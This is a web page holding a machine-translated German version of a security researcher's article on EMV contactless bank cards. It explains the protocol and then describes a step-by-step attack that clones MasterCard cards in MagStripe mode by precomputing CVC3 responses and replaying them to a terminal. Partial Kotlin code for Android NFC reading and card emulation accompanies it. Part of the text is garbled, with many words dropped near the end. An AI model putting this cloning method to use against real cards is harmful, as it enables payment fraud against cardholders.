<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🙆 😟 🤚 Klonen Sie eine kontaktlose Karte mit einer mobilen Anwendung 🤙🏾 👩‍❤️‍👩 ☢️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Es war immer interessant zu sehen, was auf einer Bankkarte unter der „Haube“ passiert. Wie das Kommunikationsprotokoll einer Bankkarte und eines POS-T...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Klonen Sie eine kontaktlose Karte mit einer mobilen Anwendung</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/421543/">  Es war immer interessant zu sehen, was auf einer Bankkarte unter der „Haube“ passiert.  Wie das Kommunikationsprotokoll einer Bankkarte und eines POS-Terminals implementiert ist, wie es funktioniert und wie sicher es ist.  Eine solche Gelegenheit bot sich mir, als ich ein Praktikum bei Digital Security absolvierte.  Beim Parsen einer bekannten Sicherheitsanfälligkeit von EMV-Karten im MagStripe-Modus wurde daher beschlossen, eine mobile Anwendung zu implementieren, die über eine kontaktlose Schnittstelle mit dem Terminal kommunizieren kann, wobei eigene Befehle und eine detaillierte Analyse von Anforderungen und Antworten verwendet werden.  Versuchen Sie auch, die Methode zum Klonen von MasterCard-Karten im MagStripe-Modus zu implementieren. <br><br>  In diesem Artikel werde ich versuchen zu beschreiben, was eine EMV-Karte ist, wie sie funktioniert und wie Sie mit Android versuchen können, Ihre MasterCard-Karte zu klonen. <br><br>  <i><b>"Es gibt einige Dinge, die man mit Geld nicht kaufen kann.</b></i>  <i><b>Für alles andere gibt es MasterCard »</b></i> <br><br><h3>  Was ist eine EMV-Karte? </h3><br>  EMV ist der internationale Standard für Bankkarten mit Chip.  <b>E</b> uropay + <b>M</b> asterCard + <b>V</b> ISA war an der Entwicklung dieses Standards beteiligt, daher der Name.  Versuchen wir herauszufinden, wie die Karte über eine kontaktlose Schnittstelle mit dem POS-Terminal kommuniziert. <br><a name="habracut"></a><br>  Beginnen wir mit den Grundlagen. <br><br>  Eine physische kontaktlose EMV-Karte funktioniert fast genauso wie ein RFID-Tag.  Wenn es einfach ist, tritt der Chip in das elektromagnetische Feld ein und in einem geschlossenen leitenden Stromkreis (in unserem Fall ist es eine Antenne, die sich um den Umfang befindet), der in einem magnetischen Wechselfeld angeordnet ist, wird ein elektrischer Wechslerstrom erzeugt.  Dieser Strom lädt einen speziellen Kondensator auf, der parallel zum Resonanzkreis der Karte geschaltet ist.  Die im Kondensator gespeicherte Energie wird verwendet, um eine Mikroschaltungskarte für verschiedene Operationen durchzuführen.  Wenn der Leser das elektromagnetische Feld ändert, werden die Änderungen sofort auf dem Chip wahrgenommen.  Mit Hilfe der Signalmodulation können wir Informationen in binärer Form übertragen.  Wenn Sie den Lastwiderstand an der Karte anschließen und / oder die Kapazität des Kondensators ändern, können Sie den Strom im Stromkreis der Karte ändern, was zu einer Änderung des von ihr im Bereich der Leseschaltung erzeugten elektromagnetischen Feldes führt, sodass die Karte Daten überträgt.  Der Leser muss diese Änderungen erkennen.  Diese physikalische Interaktion wird durch die Norm ISO / IEC 14443 <i>„Identifikationskarten - Kontaktlose Karten für integrierte Schaltkreise - Näherungskarten“</i> geregelt. <br><br>  Der Kartenchip selbst ist eine Smartcard, auf der JavaCard ausgeführt wird, eine separate Version von Java für Plattformen mit geringen Rechenressourcen und Unterstützung für kryptografische Algorithmen.  JavaCard lädt Applets herunter, bei denen es sich um Anwendungen handelt.  Es gibt auch eine GlobalPlatform, ein bestimmter Standard für JavaCard, der die Möglichkeit bietet, Daten auf der Karte sicher zu verwalten und Anwendungen auf der Karte herunterzuladen, zu ändern und zu löschen.  In diesem Artikel werden die Sicherheitsmechanismen der Smartcard selbst nicht berücksichtigt.  Es reicht zu wissen, dass sich die geschützten Daten, z. B. der private Schlüssel und der geheime Hauptschlüssel der Karte, an einem sicheren Ort befinden und nicht mit Standardmitteln entfernt werden können. <br><br>  Ich erinnere Sie auch an eine kleine Terminologie für diejenigen, die nicht vertraut sind. <br><br>  <b>POS-Terminal</b> (Point of Sale) - ein Gerät des Verkäufers, das eine Karte liest und eine Zahlung einleitet.  Weiterhin nennen wir dieses Gerät einfach ein Terminal. <br>  <b>Die ausstellende Bank</b> ist die Bank, die Ihre Karte ausgestellt hat. <br>  <b>Acquirer Bank</b> - eine Bank, die Verkäufern POS-Terminals ausstellt und Zahlungen von diesen verarbeitet. <br>  <b>Das Zahlungssystem</b> ist das zentrale Bindeglied zwischen der Acquirer Bank und der ausstellenden Bank. Es werden absolut alle Zahlungen ausgeführt, und es weiß, welche Bank wie viel Geld überweisen soll.  Es gibt viele Zahlungssysteme auf der Welt, neben dem bekannten <b>Visa</b> und <b>MasterCard</b> gibt es auch <b>American Express</b> , <b>China UnionPay</b> und das russische Zahlungssystem <b>MIR</b> . <br><br>  Nun, die Karte und der Leser können kommunizieren.  Sie senden sich gegenseitig APDU-Befehle in Form von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Tag-Length-Value,</a> d.h.  Der Name des Tags wird hexadezimal übertragen, seine Länge und sein Wert selbst.  Alle Befehle sind natürlich in der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Dokumentation beschrieben</a> und sehen ungefähr so ​​aus: <br><br><img src="https://habrastorage.org/webt/kn/ne/tj/knnetjhcx4h0rd7xijgzyv5goye.png" alt="Bild"><br><br>  Die Standard-EMV-Transaktion erfolgt in mehreren Schritten. Ich werde den vollständigen Interaktionsalgorithmus im Fall einer Kontaktschnittstelle beschreiben. Bei einer kontaktlosen Schnittstelle ist der Algorithmus etwas verkürzt: <br><br><ul><li>  Anwendungsauswahl; </li><li>  Initialisierung der Antragsbearbeitung; </li><li>  Anwendungsdaten lesen </li><li>  Offline-Authentifizierung </li><li>  Verarbeitungsbeschränkungen; </li><li>  Karteninhaberscheck; </li><li>  Risikomanagement auf der Seite des Terminals; </li><li>  Analyse von Terminalaktionen; </li><li>  Risikomanagement auf der Kartenseite; </li><li>  Analyse der Aktionen der Karte; </li><li>  Online-Verarbeitung; </li><li>  Der Abschluss der Operation. </li></ul><br><img src="https://habrastorage.org/webt/0y/sc/rd/0yscrdsiso65ccn0arqjwxc4joe.png" alt="Bild"><br><br>  Wir betrachten kurz jede Operation. <br><br>  Anwendungsauswahl.  Es kommt häufig vor, dass eine Karte mehrere Anwendungen enthält.  Zum Beispiel eine Bankkarte und ein Reiseticket.  Und das Terminal muss irgendwie herausfinden, wo und welcher Algorithmus verwendet werden soll.  Mit der sogenannten <b>Application Identifier (AID</b> ) wird eine Anwendung ausgewählt.  Um dies zu verstehen, sendet das Terminal einen <b>SELECT-</b> Befehl.  Die <b>AID</b> der Visa Classic-Karte sieht beispielsweise folgendermaßen aus: <b>A0000000031010</b> .  Wenn mehrere solcher Codes als Antwort eingehen und das Terminal mit mehreren Anwendungen arbeiten kann, zeigt das Terminal eine Liste an und bietet an, die von uns benötigte Anwendung auszuwählen.  Wenn das Terminal keinen der Anwendungscodes unterstützt, wird der Vorgang vom Terminal abgelehnt. <br><br>  Initialisierung der Antragsbearbeitung.  Hier wird zunächst der geografische Standort überprüft.  Zum Beispiel können Maestro Momentum-Karten nur in Russland bezahlt werden.  Diese Phase wird durchgeführt, um den Emittenten die Möglichkeit zu geben, vorhandene Online-Risikomanagementmethoden bei der Durchführung von Offline-Operationen anzuwenden.  Zu diesem Zeitpunkt kann eine EMV-Transaktion auf Initiative der Karte selbst storniert werden, wenn diese Art von Transaktion vom Emittenten in einem bestimmten Land der Welt verboten ist.  Ferner überträgt die Karte einen Satz speziell strukturierter Informationen an das Terminal, die eine Beschreibung der Funktionalität der Karte und der Anwendung enthalten. <br><br>  Anwendungsdaten lesen.  Verschiedene für die Transaktion erforderliche Kartendaten werden an das Terminal übertragen, beispielsweise Kartennummer, Ablaufdatum, Transaktionszähler und viele andere Daten.  Einige davon werden später besprochen. <br><br>  Beispieldaten: <br><br><img src="https://habrastorage.org/webt/qq/af/8u/qqaf8ualsk94r5lgoqqz9gupznc.png" alt="Bild"><br><br>  Eine Bescheinigung über den öffentlichen Schlüssel der ausstellenden Bank und die Karte selbst wird ebenfalls übermittelt.  Damit das Terminal die digitale Signatur einiger Kartendaten überprüfen kann, wird die <b>PKI-Infrastruktur</b> (Public Key Infrastructure) verwendet.  Kurz gesagt, das Zahlungssystem verfügt über zwei Schlüssel - öffentlich und privat, und das Zahlungssystem gilt für alle Teilnehmer der <b>CA (Center Authority)</b> .  Tatsächlich stellt das Zahlungssystem für jede Bank des Emittenten ein neues Schlüsselpaar aus und generiert gleichzeitig ein Zertifikat des öffentlichen Schlüssels der Bank des Emittenten, das mit dem privaten Schlüssel CA signiert wird.  Wenn die Bank eine neue Karte ausstellt, generiert sie dementsprechend ein Schlüsselpaar für die Karte und ein Zertifikat über den öffentlichen Schlüssel der Karte, das mit dem privaten Schlüssel der Bank signiert wird.  In Terminals wird normalerweise ein Zertifikat mit öffentlichem Schlüssel für verschiedene Zahlungssysteme verkabelt.  Wenn die Karte das Zertifikat des öffentlichen Schlüssels der Bank des Ausstellers und das Zertifikat der Karte selbst überträgt, kann das Terminal die gesamte Kette mithilfe des öffentlichen Schlüssels des Zahlungssystems problemlos überprüfen.  Das Terminal überprüft mithilfe des öffentlichen Schlüssels des Zahlungssystems zunächst die Echtheit des Bankzertifikats des Ausstellers. Wenn es echt ist, kann es als vertrauenswürdig eingestuft werden. Mit dem Bankzertifikat des Ausstellers können Sie nun das Zertifikat der Karte selbst überprüfen.  Weitere Details finden Sie im Artikel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zur EMV-Sicherheit</a> . <br><br>  Offline-Authentifizierung.  Das Terminal bestimmt den Typ der unterstützten Offline-Authentifizierungsmethode.  Es gibt statische ( <b>statische Datenauthentifizierung - SDA</b> ), dynamische ( <b>dynamische Datenauthentifizierung - DDA</b> ) und kombinierte ( <b>kombinierte Datenauthentifizierung - CDA</b> ).  Diese Methoden basieren ebenfalls auf PKI.  <b>SDA</b> besteht nur aus signierten Daten auf dem privaten Schlüssel der Bank des Ausstellers, <b>DDA</b> - das Terminal sendet eine Zufallszahl und die Karte muss diese mit ihrem privaten Schlüssel signieren. Das Terminal überprüft diese Signatur anhand des zuvor empfangenen Kartenzertifikats, sodass das Terminal dies sicherstellt Die Karte hat wirklich einen privaten Schlüssel - daher ist sie echt.  <b>CDA</b> ist nur eine Kombination aus beiden. <br><br>  Handhabungsbeschränkungen.  Hier prüft das Terminal die zuvor von der Karte empfangenen Daten auf die Eignung für diesen Vorgang.  Beispielsweise werden die Start- / <b>Enddaten des Ablaufdatums</b> der Anwendung <b>(Tag '5F24')</b> und des Datums des <b>Inkrafttretens der</b> <b>Anwendung (Tag '5F25') überprüft</b> .  Außerdem wird die Version der Anwendung überprüft.  Die Ergebnisse der in dieser Phase durchgeführten Operationen werden ebenfalls im <b>TVR-</b> Bericht <b>(Terminalverifizierungsergebnisse)</b> aufgezeichnet.  Basierend auf den Ergebnissen dieser Phase kann die Transaktion nicht abgebrochen werden, selbst wenn beispielsweise die Anwendung abgelaufen ist. <br><br>  Karteninhaber überprüfen.  Die Überprüfung des Karteninhabers wird durchgeführt, um die Person zu authentifizieren, die die Karte bereitgestellt hat, und um zu überprüfen, ob sie der wahre Eigentümer der Karte ist.  Der EMV-Standard bietet verschiedene <b>Methoden zur Überprüfung von Karteninhabern</b> .  Überprüfungsmethoden werden sowohl auf dem Terminal als auch auf der Karte definiert.  Sie sind in den sogenannten <b>CVM-Listen enthalten</b> .  Während der Ausführung vergleichen das Terminal und die Karte die empfangenen CVM-Listen und wählen die allgemeine Überprüfungsmethode aus. <br><br>  Liste der unterstützten Überprüfungsmethoden: <br><br><ul><li>  Kein CVM erforderlich ('011111'b); </li><li>  CVM-Verarbeitung fehlgeschlagen ('000000'b); </li><li>  Unterschrift ('011110'b); </li><li>  Online verschlüsselte verschlüsselte PIN ('000010'b); </li><li>  Überprüfung der Klartext-PIN durch ICC ('000001'b); </li><li>  Überprüfung der PIN im Klartext durch ICC und Signatur ('000011'b); </li><li>  Verschlüsselte PIN-Überprüfung durch ICC ('000100'b); </li><li>  Verschlüsselte PIN-Überprüfung durch ICC und Signatur ('000101'b). </li></ul><br>  Hier <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">gibt es</a> auch interessante Informationen zu diesem Thema. <br><br>  Risikomanagement auf der Seite des Terminals.  In dieser Phase führt das Terminal eine interne Überprüfung der Transaktionsparameter auf der Grundlage der Risikomanagementeinstellungen der übernehmenden Bank durch.  Risikomanagementverfahren können vom Terminal jederzeit zwischen dem Abschluss des Lesevorgangs der Kartendaten und der Bildung des ersten <b>GENERATE AC-</b> Befehls durch das Terminal durchgeführt werden.  Das Risikomanagement auf der Terminalseite umfasst drei Mechanismen: <br><br><ul><li>  Kontrolle der Größe der auf der Karte ausgeführten Vorgänge ( <b>Überprüfung der Bodenbegrenzung</b> ); </li><li>  zufällige Transaktionsauswahl für die Online-Autorisierung dieser Transaktion durch den Emittenten ( <b>zufällige Transaktionsauswahl</b> ); </li><li>  Überprüfung der Offline-Aktivität bei Verwendung der Karte ( <b>Velocity Checking</b> ). </li></ul><br>  Analyse von Terminalaktionen.  In dieser Phase analysiert das Terminal die Ergebnisse der vorherigen Schritte der Transaktion.  Basierend auf den Ergebnissen der Analyse entscheidet das Terminal, ob die Operation online durchgeführt, offline ausgeführt oder die Operation abgelehnt werden soll. <br><br>  Risikomanagement auf der Kartenseite.  Die Karte, die vom <b>GENERATE AC</b> Befehlsdaten über die Transaktion, das Terminal und die Ergebnisse der Terminalprüfungen erhalten hat, führt ihrerseits ihre eigenen Risikomanagementverfahren durch und trifft ihre eigene Entscheidung darüber, wie der Vorgang abgeschlossen werden soll. <br><br>  Analyse der Aktionen der Karte.  In dieser Phase schließt die Karte die Risikomanagementverfahren ab und generiert ein Antwortkryptogramm für das Terminal.  Wenn die Karte die Transaktion genehmigt, wird ein <b>Transaktionszertifikat</b> generiert.  Wenn die Karte beschließt, den Vorgang in Echtzeit auszuführen, generiert sie ein <b>ARQC (Authorization Request Cryptogram)</b> .  Wenn die Karte alternative Autorisierungsmethoden verwendet, wird die <b>Überweisung</b> zur <b>Anwendungsautorisierung verwendet</b> .  Falls die Karte die Transaktion ablehnt, klicken Sie auf <b>Anwendungsauthentifizierungs-Kryptogramm</b> . <br><br>  Ein weiteres <b>ARPC-Kryptogramm (Authorization Response Cryptogram)</b> wird zur Authentifizierung des Ausstellers benötigt.  Der Aussteller generiert ein Kryptogramm-ARPC und sendet das Kryptogramm an die Karte. Wenn die Karte das Kryptogramm bestätigt, wird der Aussteller von der Karte authentifiziert. <br><br>  Ein wenig über die Sicherheit von Schlüsseln und die gegenseitige Authentifizierung der Karte und des Ausstellers aus dem Buch von I. M. Goldovsky: <blockquote>  Die gegenseitige Authentifizierung bedeutet, dass sich die Karte und das Terminal gegenseitig mithilfe der Authentifizierung von ARQC- und ARPC-Kryptogrammen authentifizieren.  Kryptogramme sind Daten, die unter Verwendung eines geheimen Schlüssels (der der Karte und der Bank dem Aussteller bekannt ist), der Transaktionsnummer, einer vom Terminal generierten Zufallszahl sowie einiger Details der Transaktion, des Terminals und der Karte generiert werden.  Im Fall von ARPC wird der Autorisierungsantwortcode des Ausstellers ebenfalls zu den aufgelisteten Daten hinzugefügt.  Ohne Kenntnis des geheimen Schlüssels der Karte zur Erstellung eines Kryptogramms ist es unmöglich, ARQC / ARPC-Werte auf absehbare Zeit mit dem aktuellen Stand der Technik zu berechnen, und daher zeigt die Tatsache ihrer erfolgreichen Überprüfung die Authentizität der Karte und des Ausstellers an.  Die Online-Authentifizierung ist die zuverlässigste Methode zur Authentifizierung einer Karte.  Dies liegt daran, dass es direkt vom Emittenten ohne Vermittler in Form eines Terminals durchgeführt wird.  Zusätzlich wird ein 3DES-Algorithmus mit einem temporären 112-Bit-Schlüssel für die Online-Authentifizierung verwendet, dessen kryptografische Stärke der kryptografischen Stärke des RSA-Algorithmus entspricht, wobei die Länge des asymmetrischen Schlüsselmoduls für die Offline-Authentifizierung der Kartenanwendung 1700 Bit überschreitet.  Die Verwendung von asymmetrischen Schlüsseln dieser Länge auf der Karte ist immer noch recht selten.  Normalerweise werden Schlüssel mit einer Modullänge von 1024, 1152 oder 1408 Bit verwendet. </blockquote><br><br>  Letztendlich durchläuft eine Online-Transaktion eine Kette: <br>  <b>Karte &lt;--&gt; POS-Terminal &lt;--&gt; Bank Acquire &lt;--&gt; Zahlungssystem &lt;--&gt; Bankaussteller.</b> <br><br><img src="https://habrastorage.org/webt/lg/od/lo/lgodlo0oz2jbpxbje3o15q9ikgs.jpeg" alt="Bild"><br><br><h3>  Klonen Sie die MasterCard im MagStripe-Modus </h3><br>  Wir gehen direkt zum Prinzip des Klonens über.  Diese kontaktlose Kartenangriffsmethode wurde von zwei Forschern, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Michael Roland, Josef Langer</a> von der Universität Österreich, veröffentlicht.  Es basiert auf einem allgemeinen Prinzip namens <i>Skimming</i> .  Dies ist ein solches Szenario, in dem ein Angreifer Geld von einer Bankkarte stiehlt, indem er Informationen von dieser Karte liest (kopiert).  Im Allgemeinen ist es wichtig, die PIN geheim zu halten und nicht zu verlieren.  Aber in der Methode der Österreicher müssen wir das nicht wissen.  Das Klonen einer Zahlungskarte ist für die Kernel-Version der EMV Contactless Kernel 2-Anwendung erfolgreich. Die Version dieses Protokolls unterstützt zwei Betriebsmodi für kontaktlose Karten: EMV-Protokoll <b>(MasterCard PayPass M / Chip)</b> und <b>MagStripe (MasterCard PayPass MagStripe)</b> . <br><br>  <b>MagStripe</b> ist ein Magnetstreifenkarten-Unterstützungsmodus.  Dieser Modus ist auf MasterCard-Karten mit kontaktloser Schnittstelle implementiert.  Der MagStripe-Modus wird höchstwahrscheinlich für Banken benötigt, die Schwierigkeiten haben, die gesamte Infrastruktur zu übertragen, um kontaktlose EMV-Transaktionen mit Chips zu unterstützen.  Visa-Karten haben übrigens auch eine ähnliche Funktionsweise - <b>PayWave MSD (Magnetic Stripe Data)</b> . <br><br>  Der Transaktionsverarbeitungsprozess für kontaktlose Karten ist im Vergleich zu Chipkarten abgeschnitten und funktioniert normalerweise im folgenden Modus: <br><br><ol><li>  Das Terminal sendet einen <b>SELECT PPSE-Befehl</b> (Proximity Payment System Environment).  Die Karte sendet eine Liste der unterstützten Anwendungen. </li><li>  Das Terminal sendet einen <b>SELECT-</b> Befehl.  Als Antwort erhält er die erforderlichen Bewerbungsdetails. </li><li>  Das Terminal sendet den Befehl <b>GET_PROCESSING_OPTIONS</b> .  Die Karte antwortet, welche Art von Authentifizierung sie unterstützt und ob dort eine Überprüfung des Karteninhabers vorliegt. </li><li>  Das Terminal sendet den Befehl <b>READ_RECORDS</b> .  Die Antwortkarte sendet Track1 und Track2 fast genauso wie die auf dem Magnetstreifen der Karte aufgezeichneten. </li><li>  Das Terminal sendet den Befehl <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .  Dies bedeutet, dass die Karte einen CVC3-Wert basierend auf der übergebenen unvorhersehbaren Nummer generieren sollte. </li></ol><br><img src="https://habrastorage.org/webt/yx/4k/go/yx4kgocqjxhraaeqz1c4qr4ukpe.jpeg" alt="Bild"><br><br><div class="spoiler">  <b class="spoiler_title">Wie sieht das alles im wirklichen Leben aus?</b> <div class="spoiler_text">  Es sieht aus wie ein <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">APDU-</a> Team.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Liste aller Tags</a> . <br><br>  APDU - Application Protocol Data Unit ist ein Symbol eines Frames mit einem Kartenbefehl oder einer Kartenantwort. <br><br>  Zu diesem Thema gibt es <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> einige Artikel. <br></div></div><br>  Die Karte unterstützt den speziellen Befehl COMPUTE CRYPTOGRAPHIC CHECKSUM, dessen Argument die im UDOL (Unpredictable Number Data Object) definierten Daten sind.  <b>Infolgedessen berechnet die Karte unter Verwendung des 3DES-Algorithmus und des geheimen Schlüssels den dynamischen Wert CVC3 (Card Verification Code).</b>  Als Argument für die 3DES-Funktion werden die Verkettung der UDOL-Daten und des Transaktionszählers (Application Transaction Counter, ATC) verwendet.  <b>Daher hängt der Wert von CVC3 immer von den UN- und ATC-Objekten ab.</b> <br><br>  Mit anderen Worten, dieser Befehl wird benötigt, damit die Karte eine bestimmte „Signatur“ generiert, damit der Aussteller die Karte überprüfen kann.  Die Signatur der Transaktion selbst fehlt jedoch in dieser Signatur.  Die Signatur enthält <b>ATC-</b> Werte <b>- 2 Bytes</b> , <b>CVC3 (Track1) - 2 Bytes</b> , <b>CVC3 (Track2) - 2 Bytes</b> , die von der Karte basierend auf dem geheimen Schlüssel generiert werden, den auch die ausstellende Bank und der Transaktionszähler (ATC) kennen.  Gleichzeitig informiert das POS-Terminal zum Generieren der Signatur die <b>UN-</b> Karte <b>(Unpredictable Number)</b> - 4 Byte, die auch bei der Generierung der Signatur verwendet wird.  Die unvorhersehbare Nummer verhindert die Generierung von Authentifizierungscodes auf einer realen Karte für die spätere Verwendung bei betrügerischen Transaktionen.  Bei Angriffen stört uns die UN stark, da es nicht möglich ist, 4 Bytes aufzulisten, ohne die Grenzen des Transaktionszählers zu überschreiten.  Es gibt jedoch einige Schwachstellen in der Spezifikation. <br><br>  Erstens beschränkt die Spezifikation UN auf die Codierung von Zahlen, nämlich den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Binary Decimal Code (BCD)</a> , was im Wesentlichen bedeutet, dass bei Betrachtung einer solchen codierten Zahl in HEX nur Zahlen von 0 bis 9 angezeigt werden und alle anderen Werte berücksichtigt werden als ob verboten.  Somit verringert sich die Menge an UN von 4.294.967.295 auf 99.999.999. <br><br>  Zweitens wird die Anzahl der signifikanten UN-Ziffern durch die Karte bestimmt.  Abhängig von den speziellen Parametern in den Spuren kann die Anzahl der Ziffern in der UNO je nach Kartentyp zwischen 10 und 10.000 liegen. In der Praxis werden am häufigsten 1000 Werte gefunden. <br><br>  <b>Der Angriffsplan lautet also wie folgt:</b> <br><br><ol><li>  Wir lesen die Karte und finden die Anzahl der signifikanten Stellen von UN heraus, die das Terminal bereitstellen wird </li><li>  Wir sortieren alle UNs, erhalten alle möglichen Werte der Funktion <b>COMPUTE_CRYPTOGRAHIC_CHECKSUM</b> und speichern sie in der entsprechenden Tabelle mit der Zuordnung UN -&gt; Ergebnis </li><li>  Wir bringen es zum POS-Terminal und finden die Nummer heraus, nach der das POS-Terminal fragt. </li><li>  Wir wählen das gewünschte Ergebnis aus der Tabelle aus und ersetzen es als Antwort auf das Terminal. </li><li>  Die Transaktion wird beendet. </li><li>  GEWINN.  Der Erfolg der Genehmigung der Transaktion ist jedoch nicht garantiert, da die ausstellende Bank eine solche Transaktion ablehnen kann. </li></ol><br><img src="https://habrastorage.org/webt/5q/iw/uh/5qiwuhgbebcdx_0bdzdbrvwmcd0.jpeg" alt="Bild"><br><br>  Es ist auch erwähnenswert, dass der Transaktionszähler (ATC) die Wiederverwendung zuvor verwendeter Authentifizierungscodes verhindert. Wenn wir diesen Angriff verwenden, müssen wir die Karte erneut kopieren, da der Transaktionszähler bereits zum Abrufen von Informationen verwendet wurde und in der Signatur verwendet wurde Wenn wir einen Transaktionszähler von 1000 hatten und nachdem wir die Transaktion an die Bank gesendet haben, akzeptiert die Bank keine Transaktionen mehr mit einem Zähler unter &lt;1001.  ,    2 ,  ,       65   ,       . <br><br>           . ,  <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .    CVC3 ,       <b>SELECT</b> ,  <b>GET_PROCESSING_OPTIONS</b> ,    <b>COMPUTE_CRYPTOGRACHIC_CHECKSUM</b>     .       CVC3.         , <b> 1000   Google Galaxy Nexus S    .</b> <br><br>         <b>Terminal Simulator</b>  MasterCard.      NFC-    .      .        POS-           .         ,    . <br><br><img src="https://habrastorage.org/webt/if/cw/ka/ifcwkapz8euoz-fdb9hnmbedigq.png" alt="Bild"><br><br>     NFC  <b>ACR122</b> . <br><br><img src="https://habrastorage.org/webt/kx/75/q8/kx75q8xlkxsg3q3hodn9h1yze2o.jpeg" alt="Bild"><br><br>        .      Kotlin  Android.      . <br><br><pre><code class="plaintext hljs">data class Command( var CLA: String = 0x00.toString(), var INS: String = 0x00.toString(), var P1: String = "", var P2: String = "", var Lc: String = "", var Nc: String = "", var Le: String = "", var Nr: String = "", var SW1WS2: String = "" ) { fun split(): ByteArray { return getHexString().hexToByteArray() } fun getHexString() = CLA.plus(INS).plus(P1).plus(P2).plus(Lc).plus(Nc).plus(Le).plus(Nr).plus(SW1WS2) }</code> </pre> <br>  Zuerst müssen wir die Arbeit mit NFC einrichten.  Am Telefon können wir in zwei Modi arbeiten.  Im Kartenmodus reagieren wir auf Befehle vom Terminal und im Terminalmodus, wenn wir Befehle senden und beispielsweise eine Karte lesen.  Das heißt,  Zuerst können wir die Karte klonen und dann sicherstellen, dass wir auf Anfragen vom Terminal mit bereits vorbereiteten Befehlen antworten. <br><br>  Das Folgende ist eine vereinfachte Implementierung der Interaktion mit NFC: <br><br><pre> <code class="plaintext hljs"> private var nfcAdapter: NfcAdapter? = null /*!&lt; represents the local NFC adapter */ private var tag: Tag? = null /*!&lt; represents an NFC tag that has been discovered */ private lateinit var tagcomm: IsoDep /*!&lt; provides access to ISO-DEP (ISO 14443-4) */ private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name)) /*!&lt; NFC tech lists */ private var nfcintent: PendingIntent? = null .... override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) nfcAdapter = NfcAdapter.getDefaultAdapter(this) nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0) cardEmulation = CardEmulation.getInstance(nfcAdapter) nfcAdapter?.enableForegroundDispatch(this, nfcintent, null, nfctechfilter) } .... override fun onNewIntent(intent: Intent) { super.onNewIntent(intent) tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) cardReading(tag) } ..... override fun onResume() { super.onResume() if (canSetPreferredCardEmulationService()) { this.cardEmulation?.setPreferredService(this, ComponentName(this, "com.nooan.cardpaypasspass.NfcService")); } } override fun onPause() { if (canSetPreferredCardEmulationService()) { this.cardEmulation?.unsetPreferredService(this) } super.onPause() } private fun cardReading(tag: Tag?) { tagcomm = IsoDep.get(tag) try { tagcomm.connect() } catch (e: IOException) { error = "Reading card data ... Error tagcomm: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } try { when { commands != null -&gt; readCardWithOurCommands() mChip -&gt; readCardMChip() else -&gt; readCardMagStripe() } } catch (e: IOException) { error = "Reading card data ... Error tranceive: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } finally { tagcomm.close() } } protected fun execute(command: Command, log:Boolean): ByteArray { val bytes = command.split() listLogs.add(bytes.toHex()) val recv = tagcomm.transceive(bytes) listLogs.add(recv.toHex()) return recv }</code> </pre><br>  Dies beschreibt die Reihenfolge der 